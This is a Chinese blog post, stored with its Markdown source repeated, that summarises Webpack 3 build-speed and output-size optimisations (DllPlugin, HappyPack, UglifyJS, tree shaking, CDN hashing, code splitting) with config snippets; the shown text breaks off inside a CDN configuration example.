使用HotModuleReplacementPlugin，比较麻烦\n\n开启后如果修改子模块就可以实现局部刷新，但如果修改的是根JS文件，会整页刷新，原因在于，子模块更新时，事件一层层向上传递，直到某层的文件接收了当前变化的模块，然后执行回调函数。如果一层层向外抛直到最外层都没有文件接收，就会刷新整页。\n\n使用 `NamedModulesPlugin` 可以使控制台打印出被替换的模块的名称而非数字ID，另外同webpack监听，忽略node_modules目录的文件可以提升性能。\n\n## 三、优化输出质量-压缩文件体积\n\n### 3.1 区分环境--减小生产环境代码体积\n\n代码运行环境分为开发环境和生产环境，代码需要根据不同环境做不同的操作，许多第三方库中也有大量的根据开发环境判断的if else代码，构建也需要根据不同环境输出不同的代码，所以需要一套机制可以在源码中区分环境，区分环境之后可以使输出的生产环境的代码体积减小。Webpack中使用DefinePlugin插件来定义配置文件适用的环境。\n\n```javascript\nconst DefinePlugin = require('webpack/lib/DefinePlugin');\n//...\nplugins:[\n    new DefinePlugin({\n        'process.env': {\n            NODE_ENV: JSON.stringify('production')\n        }\n    })\n]\n```\n\n注意，`JSON.stringify('production')` 的原因是，环境变量值需要一个双引号包裹的字符串，而stringify后的值是`'\"production\"'`\n\n然后就可以在源码中使用定义的环境：\n\n```javascript\nif(process.env.NODE_ENV === 'production'){\n    console.log('你在生产环境')\n    doSth();\n}else{\n    console.log('你在开发环境')\n    doSthElse();\n}\n```\n\n当代码中使用了process时，Webpack会自动打包进process模块的代码以支持非Node.js的运行环境，这个模块的作用是模拟Node.js中的process，以支持`process.env.NODE_ENV === 'production'` 语句。\n\n### 3.2  压缩代码-JS、ES、CSS \n\n1. **压缩JS：Webpack内置UglifyJS插件、ParallelUglifyPlugin**\n\n   会分析JS代码语法树，理解代码的含义，从而做到去掉无效代码、去掉日志输入代码、缩短变量名等优化。常用配置参数如下：\n\n   ```javascript\n   const UglifyJSPlugin = require('webpack/lib/optimize/UglifyJsPlugin');\n   //...\n   plugins: [\n       new UglifyJSPlugin({\n           compress: {\n               warnings: false,  //删除无用代码时不输出警告\n               drop_console: true,  //删除所有console语句，可以兼容IE\n               collapse_vars: true,  //内嵌已定义但只使用一次的变量\n               reduce_vars: true,  //提取使用多次但没定义的静态值到变量\n           },\n           output: {\n               beautify: false, //最紧凑的输出，不保留空格和制表符\n               comments: false, //删除所有注释\n           }\n       })\n   ]\n   ```\n\n   使用`webpack --optimize-minimize` 启动webpack，可以注入默认配置的UglifyJSPlugin\n\n2. **压缩ES6：第三方UglifyJS插件**\n\n   随着越来越多的浏览器支持直接执行ES6代码，应尽可能的运行原生ES6，这样比起转换后的ES5代码，代码量更少，且ES6代码性能更好。直接运行ES6代码时，也需要代码压缩，第三方的uglify-webpack-plugin提供了压缩ES6代码的功能：\n\n   ```javascript\n   npm i -D uglify-webpack-plugin@beta //要使用最新版本的插件\n   //webpack.config.json\n   const UglifyESPlugin = require('uglify-webpack-plugin');\n   //...\n   plugins:[\n       new UglifyESPlugin({\n           uglifyOptions: {  //比UglifyJS多嵌套一层\n               compress: {\n                   warnings: false,\n                   drop_console: true,\n                   collapse_vars: true,\n                   reduce_vars: true\n               },\n               output: {\n                   beautify: false,\n                   comments: false\n               }\n           }\n       })\n   ]\n   ```\n\n   另外要防止babel-loader转换ES6代码，要在.babelrc中去掉babel-preset-env，因为正是babel-preset-env负责把ES6转换为ES5。\n\n3. **压缩CSS：css-loader?minimize、PurifyCSSPlugin**\n\n   cssnano基于PostCSS，不仅是删掉空格，还能理解代码含义，例如把`color:#ff0000` 转换成 `color:red`，css-loader内置了cssnano，只需要使用 `css-loader?minimize` 就可以开启cssnano压缩。\n\n   另外一种压缩CSS的方式是使用[PurifyCSSPlugin](https://github.com/webpack-contrib/purifycss-webpack)，需要配合 `extract-text-webpack-plugin` 使用，它主要的作用是可以去除没有用到的CSS代码，类似JS的Tree Shaking。\n\n### 3.3 使用Tree Shaking剔除JS死代码 \n\nTree Shaking可以剔除用不上的死代码，它依赖ES6的import、export的模块化语法，最先在Rollup中出现，Webpack 2.0将其引入。适合用于Lodash、utils.js等工具类较分散的文件。**它正常工作的前提是代码必须采用ES6的模块化语法**，因为ES6模块化语法是静态的（在导入、导出语句中的路径必须是静态字符串，且不能放入其他代码块中）。如果采用了ES5中的模块化，例如module.export = {...}、require( x+y )、if (x) { require( './util' ) }，则Webpack无法分析出可以剔除哪些代码。\n\n**启用Tree Shaking：**\n\n   1. 修改.babelrc以保留ES6模块化语句：\n\n      ```javascript\n      {\n          \"presets\": [\n              [\n                  \"env\", \n                  { \"module\": false },   //关闭Babel的模块转换功能，保留ES6模块化语法\n              ]\n          ]\n      }\n      ```\n\n   2. 启动webpack时带上 --display-used-exports可以在shell打印出关于代码剔除的提示\n\n   3. 使用UglifyJSPlugin，或者启动时使用--optimize-minimize\n\n   4. 在使用第三方库时，需要配置 `resolve.mainFields: ['jsnext:main', 'main']` 以指明解析第三方库代码时，采用ES6模块化的代码入口\n\n## 四、优化输出质量--加速网络请求\n\n### 4.1 使用CDN加速静态资源加载\n\n1. **CND加速的原理**\n\n   CDN通过将资源部署到世界各地，使得用户可以就近访问资源，加快访问速度。要接入CDN，需要把网页的静态资源上传到CDN服务上，在访问这些资源时，使用CDN服务提供的URL。\n\n   由于CDN会为资源开启长时间的缓存，例如用户从CDN上获取了index.html，即使之后替换了CDN上的index.html，用户那边仍会在使用之前的版本直到缓存时间过期。业界做法：\n\n   - **HTML文件：放在自己的服务器上且关闭缓存，不接入CDN**\n   - **静态的JS、CSS、图片等资源：开启CDN和缓存，同时文件名带上由内容计算出的Hash值**，这样只要内容变化hash就会变化，文件名就会变化，就会被重新下载而不论缓存时间多长。\n\n   另外，HTTP1.x版本的协议下，浏览器会对于向同一域名并行发起的请求数限制在4~8个。那么把所有静态资源放在同一域名下的CDN服务上就会遇到这种限制，所以可以把他们**分散放在不同的CDN服务**上，例如JS文件放在js.cdn.com下，将CSS文件放在css.cdn.com下等。这样又会带来一个新的问题：增加了域名解析时间，这个可以通过**dns-prefetch**来解决 `<link rel='dns-prefetch' href='//js.cdn.com'>` 来缩减域名解析的时间。形如**`//xx.com` 这样的URL省略了协议**，这样做的好处是，浏览器在访问资源时会自动根据当前URL采用的模式来决定使用HTTP还是HTTPS协议。\n\n2. **总之，构建需要满足以下几点：**\n\n   - 静态资源导入的URL要变成指向CDN服务的绝对路径的URL\n   - 静态资源的文件名需要带上根据内容计算出的Hash值\n   - 不同类型资源放在不同域名的CDN上\n\n3. **最终配置：**\n\n   ```javascript\n   const ExtractTextPlugin = require('extract-text-webpack-plugin');\n   const {WebPlugin} = require('web-webpack-plugin');\n   //...\n   output:{\n    filename: '[name]_[chunkhash:8].js',\n    path: path.resolve(__dirname, 'dist'),\n    publicPatch: '//js.cdn.com/id/', //指定存放JS文件的CDN地址\n   },\n   module:{\n    rules:[{\n        test: /\\.css/,\n        use: ExtractTextPlugin.extract({\n            use: ['css-loader?minimize'],\n            publicPatch: '//img.cdn.com/id/', //指定css文件中导入的图片等资源存放的cdn地址\n        }),\n    },{\n       test: /\\.png/,\n       use: ['file-loader?name=[name]_[hash:8].[ext]'], //为输出的PNG文件名加上Hash值 \n    }]\n   },\n   plugins:[\n     new WebPlugin({\n        template: './template.html',\n        filename: 'index.html',\n        stylePublicPath: '//css.cdn.com/id/', //指定存放CSS文件的CDN地址\n     }),\n    new ExtractTextPlugin({\n        filename:`[name]_[contenthash:8].css`, //为输出的CSS文件加上Hash\n    })\n   ]\n   ```\n\n\n### 4.2 多页面应用提取页面间公共代码，以利用缓存 \n\n1. **原理**\n\n   大型网站通常由多个页面组成，每个页面都是一个独立的单页应用，多个页面间肯定会依赖同样的样式文件、技术栈等。如果不把这些公共文件提取出来，那么每个单页打包出来的chunk中都会包含公共代码，相当于要传输n份重复代码。如果把公共文件提取出一个文件，那么当用户访问了一个网页，加载了这个公共文件，再访问其他依赖公共文件的网页时，就直接使用文件在浏览器的缓存，这样公共文件就只用被传输一次。\n\n2. **应用方法**\n\n   1. 把多个页面依赖的公共代码提取到common.js中，此时common.js包含基础库的代码\n\n      ```javascript\n      const CommonsChunkPlugin = require('webpack/lib/optimize/CommonsChunkPlugin');\n      //...\n      plugins:[\n          new CommonsChunkPlugin({\n              chunks:['a','b'], //从哪些chunk中提取\n              name:'common',  // 提取出的公共部分形成一个新的chunk\n          })\n      ]\n      ```\n\n   2. 找出依赖的基础库，写一个base.js文件，再与common.js提取公共代码到base中，common.js就剔除了基础库代码，而base.js保持不变\n\n      ```javascript\n      //base.js\n      import 'react';\n      import 'react-dom';\n      import './base.css';\n      //webpack.config.json\n      entry:{\n          base: './base.js'\n      },\n      plugins:[\n          new CommonsChunkPlugin({\n              chunks:['base','common'],\n              name:'base',\n              //minChunks:2, 表示文件要被提取出来需要在指定的chunks中出现的最小次数，防止common.js中没有代码的情况\n          })        \n      ]\n      ```\n\n   3. 得到基础库代码base.js，不含基础库的公共代码common.js，和页面各自的代码文件xx.js。\n\n      页面引用顺序如下：base.js--> common.js--> xx.js\n\n### 4.3 分割代码以按需加载\n\n1. **原理**\n\n   单页应用的一个问题在于使用一个页面承载复杂的功能，要加载的文件体积很大，不进行优化的话会导致首屏加载时间过长，影响用户体验。做按需加载可以解决这个问题。具体方法如下：\n\n   1. 将网站功能按照相关程度划分成几类\n   2. 每一类合并成一个Chunk，按需加载对应的Chunk\n   3. 例如，只把首屏相关的功能放入执行入口所在的Chunk，这样首次加载少量的代码，其他代码要用到的时候再去加载。最好提前预估用户接下来的操作，提前加载对应代码，让用户感知不到网络加载\n\n2. **做法**\n\n   一个最简单的例子：网页首次只加载main.js，网页展示一个按钮，点击按钮时加载分割出去的show.js，加载成功后执行show.js里的函数\n\n   ```javascript\n   //main.js\n   document.getElementById('btn').addEventListener('click',function(){\n       import(/* webpackChunkName:\"show\" */ './show').then((show)=>{\n           show('Webpack');\n       })\n   })\n   //show.js\n   module.exports = function (content) {\n       window.alert('Hello ' + content);\n   }\n   ```\n\n   `import(/* webpackChunkName:show */ './show').then()` 是实现按需加载的关键，Webpack内置对import( \\*)语句的支持，Webpack会以`./show.js`为入口重新生成一个Chunk。代码在浏览器上运行时只有点击了按钮才会开始加载show.js，且import语句会返回一个Promise，加载成功后可以在then方法中获取加载的内容。这要求浏览器支持Promise API，对于不支持的浏览器，需要注入Promise polyfill。`/* webpackChunkName:show */` 是定义动态生成的Chunk的名称，默认名称是[id].js，定义名称方便调试代码。为了正确输出这个配置的ChunkName，还需要配置Webpack：\n\n   ```javascript\n   //...\n   output:{\n       filename:'[name].js',\n       chunkFilename:'[name].js', //指定动态生成的Chunk在输出时的文件名称\n   }\n   ```\n\n   书中另外提供了更复杂的React-Router中异步加载组件的实战场景。P212\n\n## 五、优化输出质量--提升代码运行时的效率\n\n   ### 5.1 使用Prepack提前求值\n\n   1. **原理：**\n\n      Prepack是一个部分求值器，编译代码时提前将计算结果放到编译后的代码中，而不是在代码运行时才去求值。通过在便一阶段预先执行源码来得到执行结果，再直接将运行结果输出以提升性能。但是现在Prepack还不够成熟，用于线上环境还为时过早。\n\n   2. **使用方法**\n\n      ```javascript\n      const PrepackWebpackPlugin = require('prepack-webpack-plugin').default;\n      module.exports = {\n          plugins:[\n              new PrepackWebpackPlugin()\n          ]\n      }\n      ```\n\n   ### 5.2 使用Scope Hoisting\n\n   1. **原理**\n\n      译作“作用域提升”，是在Webpack3中推出的功能，它分析模块间的依赖关系，尽可能将被打散的模块合并到一个函数中，但不能造成代码冗余，所以只有被引用一次的模块才能被合并。由于需要分析模块间的依赖关系，所以源码必须是采用了ES6模块化的，否则Webpack会降级处理不采用Scope Hoisting。\n\n   2. **使用方法**\n\n      ```javascript\n      const ModuleConcatenationPlugin = require('webpack/lib/optimize/ModuleConcatenationPlugin');\n      //...\n      plugins:[\n          new ModuleConcatenationPlugin();\n      ],\n      resolve:{\n      \tmainFields:['jsnext:main','browser','main']\n      }\n      ```\n\n      `webpack --display-optimization-bailout` 输出日志中会提示哪个文件导致了降级处理\n\n## 六、使用输出分析工具\n\n   启动Webpack时带上这两个参数可以生成一个json文件，输出分析工具大多依赖该文件进行分析：\n\n   `webpack --profile --json > stats.json` 其中 `--profile` 记录构建过程中的耗时信息，`--json` 以JSON的格式输出构建结果，`>stats.json` 是UNIX / Linux系统中的管道命令，含义是将内容通过管道输出到stats.json文件中。\n\n   1. **官方工具Webpack Analyse**\n\n      打开该工具的官网http://webpack.github.io/analyse/上传stats.json，就可以得到分析结果\n\n   2. **webpack-bundle-analyzer**\n\n      可视化分析工具，比Webapck Analyse更直观。使用也很简单：\n\n      1. npm  i -g webpack-bundle-analyzer安装到全局\n      2. 按照上面方法生成stats.json文件\n      3. 在项目根目录执行`webpack-bundle-analyzer` ，浏览器会自动打开结果分析页面。\n\n## 七、其他Tips\n\n   1. 配置babel-loader时，`use: [‘babel-loader?cacheDirectory’]` cacheDirectory用于缓存babel的编译结果，加快重新编译的速度。另外注意排除node_modules文件夹，因为文件都使用了ES5的语法，没必要再使用Babel转换。\n\n   2. 配置externals，排除因为已使用\\<script\\>标签引入而不用打包的代码，noParse是排除没使用模块化语句的代码。\n\n   3. 配置performance参数可以输出文件的性能检查配置。\n\n   4. 配置profile：true，是否捕捉Webpack构建的性能信息，用于分析是什么原因导致构建性能不佳。\n\n   5. 配置cache：true，是否启用缓存来提升构建速度。\n\n   6. 可以使用url-loader把小图片转换成base64嵌入到JS或CSS中，减少加载次数。\n\n   7. 通过imagemin-webpack-plugin压缩图片，通过webpack-spritesmith制作雪碧图。\n\n   8. 开发环境下将devtool设置为cheap-module-eval-source-map，因为生成这种source map的速度最快，能加速构建。在生产环境下将devtool设置为hidden-source-map\n\n      \n\n  \n\n","source":"_posts/About_Webpack_Optimization.md","raw":"---\ntitle: 三十分钟掌握Webpack性能优化\ndate: 2018-08-02 20:30:00\ncategories: 框架 #CSS，HTTP，Javascript，NodeJS，框架\ntags: [Webpack] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\nWebpack是现在主流的功能强大的模块化打包工具，在使用Webpack时，如果不注意性能优化，有非常大的可能会产生性能问题，性能问题主要分为开发时打包构建速度慢、开发调试时的重复性工作、以及输出文件质量不高等，因此性能优化也主要从这些方面来分析。本文主要是根据自己的理解对《深入浅出Webpack》这本书进行总结，涵盖了大部分的优化方法，可以作为Webpack性能优化时的参考和检查清单。基于Webpack3.4版本，阅读本文需要您熟悉Webpack基本使用方法，读完大约需要三十分钟。\n\n<!-- more -->\n\n> From  [http://supermaryy.com](http://luckymona.github.com)\n\n## 一、优化构建速度\n\nWebpack在启动后会根据Entry配置的入口出发，递归地解析所依赖的文件。这个过程分为搜索文件和把匹配的文件进行分析、转化的两个过程，因此可以从这两个角度来进行优化配置。\n\n### 1.1 缩小文件的搜索范围\n\n**搜索过程优化方式包括：**\n\n1. **`resolve`字段告诉webpack怎么去搜索文件，所以首先要重视resolve字段的配置：**\n\n   1. 设置`resolve.modules:[path.resolve(__dirname, 'node_modules')]`避免层层查找。\n\n      `resolve.modules`告诉webpack去哪些目录下寻找第三方模块，默认值为`['node_modules']`，会依次查找./node_modules、../node_modules、../../node_modules。\n\n   2. 设置`resolve.mainFields:['main']`，设置尽量少的值可以减少入口文件的搜索步骤\n\n      第三方模块为了适应不同的使用环境，会定义多个入口文件，mainFields定义使用第三方模块的哪个入口文件，由于大多数第三方模块都使用main字段描述入口文件的位置，所以可以设置单独一个main值，减少搜索\n\n   3. 对庞大的第三方模块设置`resolve.alias`, 使webpack直接使用库的min文件，避免库内解析\n\n      如对于react：\n\n      ```javascript\n      resolve.alias:{\n      \t'react':patch.resolve(__dirname, './node_modules/react/dist/react.min.js')\n      }\n      ```\n\n      这样会影响Tree-Shaking，适合对整体性比较强的库使用，如果是像lodash这类工具类的比较分散的库，比较适合Tree-Shaking，避免使用这种方式。\n\n   4. 合理配置`resolve.extensions`，减少文件查找\n\n      默认值：`extensions:['.js', '.json']`,当导入语句没带文件后缀时，Webpack会根据extensions定义的后缀列表进行文件查找，所以：\n\n      - 列表值尽量少\n      - 频率高的文件类型的后缀写在前面\n      - 源码中的导入语句尽可能的写上文件后缀，如`require(./data)`要写成`require(./data.json)`\n\n2. **`module.noParse`字段告诉Webpack不必解析哪些文件，可以用来排除对非模块化库文件的解析**\n\n   如jQuery、ChartJS，另外如果使用resolve.alias配置了react.min.js，则也应该排除解析，因为react.min.js经过构建，已经是可以直接运行在浏览器的、非模块化的文件了。noParse值可以是RegExp、[RegExp]、function\n\n   `module:{ noParse:[/jquery|chartjs/, /react\\.min\\.js$/] }`\n\n3. **配置loader时，通过test、exclude、include缩小搜索范围**\n\n### 1.2 使用DllPlugin减少基础模块编译次数     \n\nDllPlugin动态链接库插件，**其原理是**把网页依赖的基础模块抽离出来打包到dll文件中，当需要导入的模块存在于某个dll中时，这个模块不再被打包，而是去dll中获取。**为什么会提升构建速度呢？**原因在于dll中大多包含的是常用的第三方模块，如react、react-dom，所以只要这些模块版本不升级，就只需被编译一次。我认为这样做和配置resolve.alias和module.noParse的效果有异曲同工的效果。\n\n**使用方法：**\n\n1. 使用DllPlugin配置一个webpack_dll.config.js来构建dll文件：\n\n   ```javascript\n   // webpack_dll.config.js\n   const path = require('path');\n   const DllPlugin = require('webpack/lib/DllPlugin');\n   module.exports = {\n    entry:{\n        react:['react','react-dom'],\n        polyfill:['core-js/fn/promise','whatwg-fetch']\n    },\n    output:{\n        filename:'[name].dll.js',\n        path:path.resolve(__dirname, 'dist'),\n        library:'_dll_[name]',  //dll的全局变量名\n    },\n    plugins:[\n        new DllPlugin({\n            name:'_dll_[name]',  //dll的全局变量名\n            path:path.join(__dirname,'dist','[name].manifest.json'),//描述生成的manifest文件\n        })\n    ]\n   }\n   ```\n   需要注意DllPlugin的参数中name值必须和output.library值保持一致，并且生成的manifest文件中会引用output.library值。\n\n   最终构建出的文件：\n\n   ```javascript\n    |-- polyfill.dll.js\n    |-- polyfill.manifest.json\n    |-- react.dll.js\n    └── react.manifest.json\n   ```\n   其中xx.dll.js包含打包的n多模块，这些模块存在一个数组里，并以数组索引作为ID，通过一个变量假设为\\_xx\\_dll暴露在全局中，可以通过window.\\_xx\\_dll访问这些模块。xx.manifest.json文件描述dll文件包含哪些模块、每个模块的路径和ID。然后再在项目的主config文件里使用DllReferencePlugin插件引入xx.manifest.json文件。\n\n2. 在主config文件里使用DllReferencePlugin插件引入xx.manifest.json文件：\n\n   ```javascript\n   //webpack.config.json\n   const path = require('path');\n   const DllReferencePlugin = require('webpack/lib/DllReferencePlugin');\n   module.exports = {\n       entry:{ main:'./main.js' },\n       //... 省略output、loader等的配置\n       plugins:[\n           new DllReferencePlugin({\n               manifest:require('./dist/react.manifest.json')\n           }),\n           new DllReferenctPlugin({\n               manifest:require('./dist/polyfill.manifest.json')\n           })\n       ]\n   }\n   ```\n   最终构建生成`main.js`\n\n### 1.3 使用HappyPack开启多进程Loader转换\n\n在整个构建流程中，最耗时的就是Loader对文件的转换操作了，而运行在Node.js之上的Webpack是单线程模型的，也就是只能一个一个文件进行处理，不能并行处理。HappyPack可以将任务分解给多个子进程，最后将结果发给主进程。JS是单线程模型，只能通过这种多进程的方式提高性能。   \n\nHappyPack使用如下：\n\n```javascript\nnpm i -D happypack\n// webpack.config.json\nconst path = require('path');\nconst HappyPack = require('happypack');\n\nmodule.exports = {\n    //...\n    module:{\n        rules:[{\n                test:/\\.js$/，\n                use:['happypack/loader?id=babel']\n                exclude:path.resolve(__dirname, 'node_modules')\n            },{\n                test:/\\.css/,\n                use:['happypack/loader?id=css']\n            }],\n        plugins:[\n            new HappyPack({\n                id:'babel',\n                loaders:['babel-loader?cacheDirectory']\n            }),\n            new HappyPack({\n                id:'css',\n                loaders:['css-loader']\n            })\n        ]\n    }\n}\n```\n\n除了id和loaders，HappyPack还支持这三个参数：`threads、verbose、threadpool`，threadpool代表共享进程池，即多个HappyPack实例都用同个进程池中的子进程处理任务，以防资源占用过多。\n\n### 1.4 使用ParallelUglifyPlugin开启多进程压缩JS文件\n\n使用UglifyJS插件压缩JS代码时，需要先将代码解析成Object表示的AST（抽象语法树），再去应用各种规则去分析和处理AST，所以这个过程计算量大耗时较多。ParallelUglifyPlugin可以开启多个子进程，每个子进程使用UglifyJS压缩代码，可以并行执行，能显著缩短压缩时间。\n\n使用也很简单，把原来的UglifyJS插件换成本插件即可，使用如下：\n\n```javascript\nnpm i -D webpack-parallel-uglify-plugin\n\n// webpack.config.json\nconst ParallelUglifyPlugin = require('wbepack-parallel-uglify-plugin');\n//...\nplugins: [\n    new ParallelUglifyPlugin({\n        uglifyJS:{\n            //...这里放uglifyJS的参数\n        },\n        //...其他ParallelUglifyPlugin的参数，设置cacheDir可以开启缓存，加快构建速度\n    })\n]\n```\n\n## 二、优化开发体验\n\n开发过程中修改源码后，需要自动构建和刷新浏览器，以查看效果。这个过程可以使用Webpack实现自动化，Webpack负责监听文件的变化，DevServer负责刷新浏览器。\n\n### 2.1 使用自动刷新\n\n#### 2.1.1 Webpack监听文件\n\nWebpack可以使用两种方式开启监听：1. 启动webpack时加上--watch参数；2. 在配置文件中设置watch:true。此外还有如下配置参数。合理设置watchOptions可以优化监听体验。\n\n```javascript\nmodule.exports = {\n    watch: true,\n    watchOptions: {\n        ignored: /node_modules/,\n        aggregateTimeout: 300,  //文件变动后多久发起构建，越大越好\n        poll: 1000,  //每秒询问次数，越小越好\n    }\n}\n```\n\nignored：设置不监听的目录，排除node_modules后可以显著减少Webpack消耗的内存\n\naggregateTimeout：文件变动后多久发起构建，避免文件更新太快而造成的频繁编译以至卡死，越大越好\n\npoll：通过向系统轮询文件是否变化来判断文件是否改变，poll为每秒询问次数，越小越好\n\n#### 2.1.2 DevServer刷新浏览器\n\n**DevServer刷新浏览器有两种方式**：\n\n1. 向网页中注入代理客户端代码，通过客户端发起刷新\n2. 向网页装入一个iframe，通过刷新iframe实现刷新效果\n\n默认情况下，以及 `devserver: {inline:true}` 都是采用第一种方式刷新页面。第一种方式DevServer因为不知道网页依赖哪些Chunk，所以会向每个chunk中都注入客户端代码，当要输出很多chunk时，会导致构建变慢。而一个页面只需要一个客户端，**所以关闭inline模式可以减少构建时间**，chunk越多提升月明显。关闭方式：\n\n1. 启动时使用webpack-dev-server --inline false\n2. 配置 `devserver:{inline:false}`\n\n关闭inline后入口网址变为http://localhost:8080/webpack-dev-server/\n\n另外`devServer.compress` 参数可配置是否采用Gzip压缩，默认为false\n\n### 2.2 开启模块热替换HMR\n\n模块热替换不刷新整个网页而只重新编译发生变化的模块，并用新模块替换老模块，所以预览反应更快，等待时间更少，同时不刷新页面能保留当前网页的运行状态。原理也是向每一个chunk中注入代理客户端来连接DevServer和网页。开启方式：\n\n1. webpack-dev-server --hot\n2. 使用HotModuleReplacementPlugin，比较麻烦\n\n开启后如果修改子模块就可以实现局部刷新，但如果修改的是根JS文件，会整页刷新，原因在于，子模块更新时，事件一层层向上传递，直到某层的文件接收了当前变化的模块，然后执行回调函数。如果一层层向外抛直到最外层都没有文件接收，就会刷新整页。\n\n使用 `NamedModulesPlugin` 可以使控制台打印出被替换的模块的名称而非数字ID，另外同webpack监听，忽略node_modules目录的文件可以提升性能。\n\n## 三、优化输出质量-压缩文件体积\n\n### 3.1 区分环境--减小生产环境代码体积\n\n代码运行环境分为开发环境和生产环境，代码需要根据不同环境做不同的操作，许多第三方库中也有大量的根据开发环境判断的if else代码，构建也需要根据不同环境输出不同的代码，所以需要一套机制可以在源码中区分环境，区分环境之后可以使输出的生产环境的代码体积减小。Webpack中使用DefinePlugin插件来定义配置文件适用的环境。\n\n```javascript\nconst DefinePlugin = require('webpack/lib/DefinePlugin');\n//...\nplugins:[\n    new DefinePlugin({\n        'process.env': {\n            NODE_ENV: JSON.stringify('production')\n        }\n    })\n]\n```\n\n注意，`JSON.stringify('production')` 的原因是，环境变量值需要一个双引号包裹的字符串，而stringify后的值是`'\"production\"'`\n\n然后就可以在源码中使用定义的环境：\n\n```javascript\nif(process.env.NODE_ENV === 'production'){\n    console.log('你在生产环境')\n    doSth();\n}else{\n    console.log('你在开发环境')\n    doSthElse();\n}\n```\n\n当代码中使用了process时，Webpack会自动打包进process模块的代码以支持非Node.js的运行环境，这个模块的作用是模拟Node.js中的process，以支持`process.env.NODE_ENV === 'production'` 语句。\n\n### 3.2  压缩代码-JS、ES、CSS \n\n1. **压缩JS：Webpack内置UglifyJS插件、ParallelUglifyPlugin**\n\n   会分析JS代码语法树，理解代码的含义，从而做到去掉无效代码、去掉日志输入代码、缩短变量名等优化。常用配置参数如下：\n\n   ```javascript\n   const UglifyJSPlugin = require('webpack/lib/optimize/UglifyJsPlugin');\n   //...\n   plugins: [\n       new UglifyJSPlugin({\n           compress: {\n               warnings: false,  //删除无用代码时不输出警告\n               drop_console: true,  //删除所有console语句，可以兼容IE\n               collapse_vars: true,  //内嵌已定义但只使用一次的变量\n               reduce_vars: true,  //提取使用多次但没定义的静态值到变量\n           },\n           output: {\n               beautify: false, //最紧凑的输出，不保留空格和制表符\n               comments: false, //删除所有注释\n           }\n       })\n   ]\n   ```\n\n   使用`webpack --optimize-minimize` 启动webpack，可以注入默认配置的UglifyJSPlugin\n\n2. **压缩ES6：第三方UglifyJS插件**\n\n   随着越来越多的浏览器支持直接执行ES6代码，应尽可能的运行原生ES6，这样比起转换后的ES5代码，代码量更少，且ES6代码性能更好。直接运行ES6代码时，也需要代码压缩，第三方的uglify-webpack-plugin提供了压缩ES6代码的功能：\n\n   ```javascript\n   npm i -D uglify-webpack-plugin@beta //要使用最新版本的插件\n   //webpack.config.json\n   const UglifyESPlugin = require('uglify-webpack-plugin');\n   //...\n   plugins:[\n       new UglifyESPlugin({\n           uglifyOptions: {  //比UglifyJS多嵌套一层\n               compress: {\n                   warnings: false,\n                   drop_console: true,\n                   collapse_vars: true,\n                   reduce_vars: true\n               },\n               output: {\n                   beautify: false,\n                   comments: false\n               }\n           }\n       })\n   ]\n   ```\n\n   另外要防止babel-loader转换ES6代码，要在.babelrc中去掉babel-preset-env，因为正是babel-preset-env负责把ES6转换为ES5。\n\n3. **压缩CSS：css-loader?minimize、PurifyCSSPlugin**\n\n   cssnano基于PostCSS，不仅是删掉空格，还能理解代码含义，例如把`color:#ff0000` 转换成 `color:red`，css-loader内置了cssnano，只需要使用 `css-loader?minimize` 就可以开启cssnano压缩。\n\n   另外一种压缩CSS的方式是使用[PurifyCSSPlugin](https://github.com/webpack-contrib/purifycss-webpack)，需要配合 `extract-text-webpack-plugin` 使用，它主要的作用是可以去除没有用到的CSS代码，类似JS的Tree Shaking。\n\n### 3.3 使用Tree Shaking剔除JS死代码 \n\nTree Shaking可以剔除用不上的死代码，它依赖ES6的import、export的模块化语法，最先在Rollup中出现，Webpack 2.0将其引入。适合用于Lodash、utils.js等工具类较分散的文件。**它正常工作的前提是代码必须采用ES6的模块化语法**，因为ES6模块化语法是静态的（在导入、导出语句中的路径必须是静态字符串，且不能放入其他代码块中）。如果采用了ES5中的模块化，例如module.export = {...}、require( x+y )、if (x) { require( './util' ) }，则Webpack无法分析出可以剔除哪些代码。\n\n**启用Tree Shaking：**\n\n   1. 修改.babelrc以保留ES6模块化语句：\n\n      ```javascript\n      {\n          \"presets\": [\n              [\n                  \"env\", \n                  { \"module\": false },   //关闭Babel的模块转换功能，保留ES6模块化语法\n              ]\n          ]\n      }\n      ```\n\n   2. 启动webpack时带上 --display-used-exports可以在shell打印出关于代码剔除的提示\n\n   3. 使用UglifyJSPlugin，或者启动时使用--optimize-minimize\n\n   4. 在使用第三方库时，需要配置 `resolve.mainFields: ['jsnext:main', 'main']` 以指明解析第三方库代码时，采用ES6模块化的代码入口\n\n## 四、优化输出质量--加速网络请求\n\n### 4.1 使用CDN加速静态资源加载\n\n1. **CND加速的原理**\n\n   CDN通过将资源部署到世界各地，使得用户可以就近访问资源，加快访问速度。要接入CDN，需要把网页的静态资源上传到CDN服务上，在访问这些资源时，使用CDN服务提供的URL。\n\n   由于CDN会为资源开启长时间的缓存，例如用户从CDN上获取了index.html，即使之后替换了CDN上的index.html，用户那边仍会在使用之前的版本直到缓存时间过期。业界做法：\n\n   - **HTML文件：放在自己的服务器上且关闭缓存，不接入CDN**\n   - **静态的JS、CSS、图片等资源：开启CDN和缓存，同时文件名带上由内容计算出的Hash值**，这样只要内容变化hash就会变化，文件名就会变化，就会被重新下载而不论缓存时间多长。\n\n   另外，HTTP1.x版本的协议下，浏览器会对于向同一域名并行发起的请求数限制在4~8个。那么把所有静态资源放在同一域名下的CDN服务上就会遇到这种限制，所以可以把他们**分散放在不同的CDN服务**上，例如JS文件放在js.cdn.com下，将CSS文件放在css.cdn.com下等。这样又会带来一个新的问题：增加了域名解析时间，这个可以通过**dns-prefetch**来解决 `<link rel='dns-prefetch' href='//js.cdn.com'>` 来缩减域名解析的时间。形如**`//xx.com` 这样的URL省略了协议**，这样做的好处是，浏览器在访问资源时会自动根据当前URL采用的模式来决定使用HTTP还是HTTPS协议。\n\n2. **总之，构建需要满足以下几点：**\n\n   - 静态资源导入的URL要变成指向CDN服务的绝对路径的URL\n   - 静态资源的文件名需要带上根据内容计算出的Hash值\n   - 不同类型资源放在不同域名的CDN上\n\n3. **最终配置：**\n\n   ```javascript\n   const ExtractTextPlugin = require('extract-text-webpack-plugin');\n   const {WebPlugin} = require('web-webpack-plugin');\n   //...\n   output:{\n    filename: '[name]_[chunkhash:8].js',\n    path: path.resolve(__dirname, 'dist'),\n    publicPatch: '//js.cdn.com/id/', //指定存放JS文件的CDN地址\n   },\n   module:{\n    rules:[{\n        test: /\\.css/,\n        use: ExtractTextPlugin.extract({\n            use: ['css-loader?minimize'],\n            publicPatch: '//img.cdn.com/id/', 